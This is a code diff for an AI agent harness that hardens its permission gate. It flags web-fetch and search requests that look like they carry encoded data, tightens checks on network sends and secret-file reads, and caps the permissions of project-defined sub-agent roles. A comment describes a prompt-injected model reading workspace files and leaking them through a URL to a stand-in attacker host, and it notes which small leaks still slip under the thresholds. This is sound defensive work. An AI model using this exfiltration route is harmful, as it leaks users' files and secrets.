@@ -1464,9 +1464,89 @@ function estimateToolSchemaTokens(tools) {
 // 清单的纪律是「宁可误判成要人按,不可漏判成自动执行」,两个判据各写一份必然漂移。
 // toolName 缺省(调用方没传)一律回落 'ask':保守优先,新调用面忘了传参不会静默放权。
 // 模块方向:07 调 06i 是后向边(06i 在 manifest 里排 18,07 排 23),合法。
+// 安全走查 S1(读档联网是无提示外传通道):web_fetch / web_search 在 NATIVE_TOOL_TIER 里是 read 档,nativeToolGate 对 read 在所有档位都放行 ——
+// 被提示注入的模型可以 file_read 工作区里任何文件,再 web_fetch("https://攻击者/?d=<内容>") 无提示外传(SSRF 闸只挡内网,不挡公网目的地)。
+// 联网搜索 / 抓取本身仍是 read 档(不整体变成要确认:日常研究要能无打扰地跑),但【看起来带了载荷】的请求在除 bypass 以外的所有档位先停下来问:
+//   · 网址的查询串 + fragment 总长 > 256;
+//   · 任一查询参数的值(解码后)> 128;
+//   · 路径 / 参数 / fragment 里有 ≥ 64 字符的 hex 连续串,或「像 base64」的连续串(见 webLooksEncoded);
+//   · 主机名里有 ≥ 48 字符的单个标签(DNS 外传:<编码数据>.攻击者.com;DNS 标签上限 63);
+//   · web_search 的查询 > 300 字,或查询里有 ≥ 64 字符的编码串。
+// 阈值依据:正常抓取 / 搜索的网址查询串几乎都在 100 字以内(搜索引擎结果页 ?q=…&hl=…、分页、utm 追踪参数一般 < 150),单个参数值很少过 100;
+// 常见的长 ID 都 < 64:git 提交 SHA-1 40 位、Notion / Google Docs 文档 ID 32~44 位、UUID 36 位;256 / 128 / 64 都留了余量,又足以把「整份文件内容塞进网址」拦下。
+// 没覆盖的(诚实):低于阈值的小额外传(一个 API key 约 50 字符、一个 32 位 token 能从阈值下面过去)—— 这条挡的是批量载荷,不是逐字符审计;
+// 要杜绝得对「本回合读过本地文件之后的新域名」做确认(产品形态变更,未做)。
+// 同一判据覆盖 http_request / http_download 的网址(读档以上的同类外联口:GET 带长查询串同样能外传),以及 CLI 引擎的 WebFetch / WebSearch。
+const WEB_PAYLOAD_LIMITS = Object.freeze({ queryFragmentChars: 256, paramValueChars: 128, encodedRunChars: 64, hostLabelChars: 48, searchQueryChars: 300 });
+const WEB_PAYLOAD_URL_TOOLS = Object.freeze(['web_fetch', 'WebFetch', 'http_request', 'http_download']);
+const WEB_PAYLOAD_QUERY_TOOLS = Object.freeze(['web_search', 'WebSearch']);
+// 「像编码出来的」:≥ encodedRunChars 的 hex 连续串;或 [A-Za-z0-9+/_=-] 连续串(base64 / base64url),且同时有字母和数字、连字符 / 下划线占比 ≤ 1/8
+// (长文章 slug 如 how-to-install-…-2026 连字符多、词与词之间有分隔,不算;真 base64url 里 - _ 的期望占比约 3%)。
+function webLooksEncoded(text) {
+  const t = String(text == null ? '' : text);
+  const n = WEB_PAYLOAD_LIMITS.encodedRunChars;
+  if (t.length < n) return false;
+  if (new RegExp('[0-9a-fA-F]{' + n + ',}').test(t)) return true;
+  const runs = t.match(new RegExp('[A-Za-z0-9+/_=-]{' + n + ',}', 'g')) || [];
+  for (const run of runs) {
+    if (!/[0-9]/.test(run) || !/[A-Za-z]/.test(run)) continue;
+    const seps = (run.match(/[-_]/g) || []).length;
+    if (seps * 8 > run.length) continue;
+    return true;
+  }
+  return false;
+}
+// 只做百分号解码,【不】把 + 当空格:标准 base64 里的 + 若按表单语义变成空格,连续串就被切断,载荷反而躲过了编码串判据(长度判据不受影响)。
+function webSafeDecode(s) {
+  const raw = String(s == null ? '' : s);
+  try { return decodeURIComponent(raw); } catch { return raw; }
+}
+// 返回 '' = 不像载荷;否则是命中的判据名(进日志 / 子代理拒绝文案)。纯函数,不碰网络、不做 DNS。
+function webUrlPayloadReason(url) {
+  const s = String(url == null ? '' : url).trim();
+  if (!s) return '';
+  const hashAt = s.indexOf('#');
+  const frag = hashAt >= 0 ? s.slice(hashAt + 1) : '';
+  const noHash = hashAt >= 0 ? s.slice(0, hashAt) : s;
+  const qAt = noHash.indexOf('?');
+  const query = qAt >= 0 ? noHash.slice(qAt + 1) : '';
+  const head = qAt >= 0 ? noHash.slice(0, qAt) : noHash;
+  if (query.length + frag.length > WEB_PAYLOAD_LIMITS.queryFragmentChars) return 'query_fragment_long';
+  const afterScheme = head.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
+  const slashAt = afterScheme.indexOf('/');
+  const hostPort = slashAt >= 0 ? afterScheme.slice(0, slashAt) : afterScheme;
+  const pathPart = slashAt >= 0 ? afterScheme.slice(slashAt) : '';
+  const host = hostPort.replace(/^[^@]*@/, '').replace(/:\d*$/, '');
+  if (host.split('.').some(label => label.length >= WEB_PAYLOAD_LIMITS.hostLabelChars)) return 'host_label_long';
+  const values = [];
+  for (const pair of query.split('&')) {
+    if (!pair) continue;
+    const eq = pair.indexOf('=');
+    values.push(webSafeDecode(eq >= 0 ? pair.slice(eq + 1) : pair));
+  }
+  if (values.some(v => v.length > WEB_PAYLOAD_LIMITS.paramValueChars)) return 'param_long';
+  const pieces = [...pathPart.split('/').map(webSafeDecode), ...values, webSafeDecode(frag)];
+  if (pieces.some(webLooksEncoded)) return 'encoded_run';
+  return '';
+}
+// 工具名容忍 serverId__ / mcp__server__ 前缀(Claude 引擎经 MCP 叫的是 mcp__ruyi__web_fetch)。
+function webPayloadReason(toolName, input) {
+  const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
+  if (!input || typeof input !== 'object' || Array.isArray(input)) return '';
+  if (WEB_PAYLOAD_QUERY_TOOLS.includes(bare)) {
+    const q = String(input.query == null ? '' : input.query);
+    if (q.length > WEB_PAYLOAD_LIMITS.searchQueryChars) return 'search_query_long';
+    if (q.split(/\s+/).some(webLooksEncoded)) return 'search_encoded_run';
+    return '';
+  }
+  if (WEB_PAYLOAD_URL_TOOLS.includes(bare)) return webUrlPayloadReason(input.url);
+  return '';
+}
 function nativeToolGate(mode, tier, toolName, input) {
   // v1.4.3: accept both 'bypass' (internal) and 'bypassPermissions' (CLI-native) as full-bypass
   if (mode === 'bypass' || mode === 'bypassPermissions') return 'allow';
+  // 安全走查 S1:联网请求看起来带了载荷 → 除 bypass 以外所有档位(含 plan、read 档)先确认;走既有的权限请求,不另造一套。
+  if (toolName && webPayloadReason(toolName, input)) return 'ask';
   if (tier === 'read') return 'allow';
   if (mode === 'plan' || mode === 'dontAsk') return 'block';
   // v1.4.3: 'auto' mode — AI risk-classifier decides. In the native engine we approximate:
@@ -1477,7 +1557,8 @@ function nativeToolGate(mode, tier, toolName, input) {
     if (!toolName) return 'ask';                                    // 调用方没给名字 = 保守问
     // 2026-10:命令是拼出来 / 编码出来 / 求值出来的(强信号,06i stewardAutoAskIndirect)也停下来问 ——
     // 字面量判据看不穿它真正要跑什么。管家对这一类不代批(13l),只能用户亲自按。
-    return (stewardToolPermanentlyExempt(toolName, input) || stewardAutoAskIndirect(input)) ? 'ask' : 'allow';
+    // 安全走查 S2:网络外发与读数据根密钥文件(06i stewardAutoAskSensitiveKind)同样停下来问;命令类工具才扫,编排类的任务描述文字不扫。
+    return (stewardToolPermanentlyExempt(toolName, input) || stewardAutoAskIndirect(input) || stewardAutoAskSensitiveKind(toolName, input) !== '') ? 'ask' : 'allow';
   }
   return 'ask';
 }
@@ -2118,7 +2199,10 @@ async function readClaudeProjectAgentRoles(cwd) {
   }
   return out;
 }
-async function getAgentRoleLibrary(cwd, config) {
+// 安全走查 S3:opts.parentMode = 调用方认的父回合档位(缺省取 config.permissionMode —— 回合内的 config 已解析成这条线程的档)。
+// 项目来源的角色(.ruyi/agents.json / .claude/agents)在返回时带上【有效档位】标注(effectivePermissionMode / effectiveToolTier / roleClamped),
+// 角色自己声明的 permissionMode / toolTier 原样保留(设置页编辑器原样存回);真正的夹紧在子代理起跑处(08 / 07)按那一刻的父档再算一次。
+async function getAgentRoleLibrary(cwd, config, opts) {
   const merged = new Map();
   for (const raw of BUILTIN_AGENT_ROLES) { const role = normalizeAgentRole(raw, { source: 'builtin', builtin: true }); merged.set(role.id, role); }
   for (const role of (Array.isArray(config.agentRoleOverrides) ? config.agentRoleOverrides : [])) {
@@ -2129,7 +2213,8 @@ async function getAgentRoleLibrary(cwd, config) {
   }
   const claudeNative = await readClaudeProjectAgentRoles(cwd);
   for (const role of claudeNative) if (!merged.has(role.id)) merged.set(role.id, role);
-  return [...merged.values()].filter(Boolean);
+  const parentMode = (opts && opts.parentMode) || (config && config.permissionMode) || 'default';
+  return [...merged.values()].filter(Boolean).map(role => annotateAgentRoleEffective(role, parentMode));
 }
 // 项目级写入(.ruyi/agents.json、.ruyi/workflows.json)的 cwd 来自请求体:目录不存在或是个文件时,下面的 mkdir 会抛
 // ENOTDIR / EEXIST,路由兜底成 500,还把带宿主路径的 errno 原文回给前端。写前先 stat 一下:不是目录就回 400 人话
@@ -2157,7 +2242,8 @@ async function buildClaudeAgentDefinitions(cwd, config, jsonBudget = 6000) {
     const d = { description: role.description || role.label, prompt: role.prompt || role.description || role.label };
     if (role.claudeTools && role.claudeTools.length) d.tools = role.claudeTools;
     if (role.models && role.models.claude && role.models.claude !== 'inherit') d.model = role.models.claude;
-    const pm = claudePermissionMode(role.permissionMode); if (pm) d.permissionMode = pm;
+    // 安全走查 S3:项目来源的角色把权限档夹到不高于这一回合的线程档位再交给 CLI(CLI 的 --agents 子代理按这个档起跑,不夹就能靠项目角色放宽)。
+    const pm = claudePermissionMode(clampAgentRoleToParent(role, role.toolTier, config && config.permissionMode).permissionMode || role.permissionMode); if (pm) d.permissionMode = pm;
     if (role.mcpServers && role.mcpServers.length) d.mcpServers = role.mcpServers;
     if (role.budgets && role.budgets.claude) d.maxTurns = role.budgets.claude;
     if (role.isolation === 'worktree') d.isolation = 'worktree';
@@ -2289,10 +2375,14 @@ async function runClaudeSubAgentOnce({ config, parentSession, task, displayTask,
       iters: 0, toolCalls: 0 };
   }
   const role = roleDefinition || null;
-  const tier = (toolTier === 'edit' || toolTier === 'exec') ? toolTier : 'read';
+  const tier0 = (toolTier === 'edit' || toolTier === 'exec') ? toolTier : 'read';
   const subModel = String(model || (role && role.models && role.models.claude !== 'inherit' && role.models.claude) || '').trim();
 
-  const roleMode = role && role.permissionMode && role.permissionMode !== 'inherit' ? role.permissionMode : '';
+  // 安全走查 S3:项目来源的角色(.ruyi/agents.json 等)把有效权限档 / 工具级夹到不高于父回合档位;builtin / global 来源逐字不变。
+  const roleGuard = clampAgentRoleToParent(role, tier0, permModeOverride === 'plan' ? 'plan' : (permModeOverride || config.permissionMode || 'default'));
+  const tier = roleGuard.toolTier;
+  if (roleGuard.clamped) { try { logEvent({ kind: 'agent_role_clamped', engine: 'claude', roleId: role && role.id || '', source: role && role.source || '', clamped: roleGuard.clamped }); } catch { /* 遥测不阻断 */ } }
+  const roleMode = roleGuard.permissionMode;
   // 线程 / 工作流下发的只做计划档压过角色自带的档(与 OpenAI 路径 08 runSubAgentCoreBody 同一条优先级)。
   const requestedMode = permModeOverride === 'plan' ? 'plan' : (roleMode || permModeOverride || config.permissionMode || 'default');
   const grant = claudeSubagentPermission(requestedMode, tier, role && role.claudeTools);
@@ -2357,7 +2447,7 @@ async function runClaudeSubAgentOnce({ config, parentSession, task, displayTask,
   const env = effectiveAnthropicEnv(config);
   if (fakeClaude) env.WCW_FAKE_INTERACTIVE = '1';
 
-  onEvent({ type: 'subagent', id: subagentId, state: 'start', task: String(displayTask != null ? displayTask : task || ''), toolTier: tier, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', permissionMode: role && role.permissionMode || 'inherit', mcpServers: roleMcpServers, engine: 'claude' });
+  onEvent({ type: 'subagent', id: subagentId, state: 'start', task: String(displayTask != null ? displayTask : task || ''), toolTier: tier, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', permissionMode: roleGuard.permissionMode || 'inherit', ...(roleGuard.clamped ? { roleClamped: roleGuard.clamped } : {}), mcpServers: roleMcpServers, engine: 'claude' });
 
   const workingDir = cwd || process.cwd();
   await fsp.mkdir(workingDir, { recursive: true }).catch(() => {});
